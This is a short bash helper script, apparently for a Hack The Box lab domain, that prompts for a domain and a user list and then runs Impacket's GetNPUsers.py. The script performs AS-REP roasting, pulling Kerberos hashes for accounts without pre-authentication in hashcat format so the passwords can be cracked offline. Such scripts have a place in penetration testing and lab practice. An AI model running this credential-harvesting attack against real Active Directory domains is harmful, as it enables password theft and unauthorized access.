#!/bin/bash
# I just can't remember the freaking syntax

# GetNPUsers.py <domain>/ -usersfile <userfile> -format hashcat -output hashes.txt

echo 'NOTE: This script assumes that you have no credentials provided'

echo 'Domain (e.g tombwatcher.htb): '
read domain

echo 'Users.txt file (e.g users.txt): ' 
read users

GetNPUsers.py $domain/ -usersfile $users -format hashcat -output hashes.txt
